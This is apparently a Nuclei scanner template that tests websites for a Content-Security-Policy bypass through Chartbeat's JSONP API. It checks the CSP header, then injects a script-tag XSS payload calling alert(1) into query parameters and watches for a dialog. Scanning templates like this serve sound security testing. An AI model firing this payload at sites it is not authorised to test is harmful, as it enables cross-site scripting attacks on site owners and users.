flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - chartbeat_api_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <script src="https://api.chartbeat.com/toppages/?jsonp=alert(1)-"></script>
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: chartbeat_api_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - chartbeat.com
  method: GET
  path:
  - '{{BaseURL}}'
id: chartbeat-api-csp-bypass
info:
  author: renniepak,DhiyaneshDK
  metadata:
    verified: true
  name: Content-Security-Policy Bypass - Chartbeat API
  reference:
  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  severity: medium
  tags: xss,csp-bypass,chartbeat-api,vuln
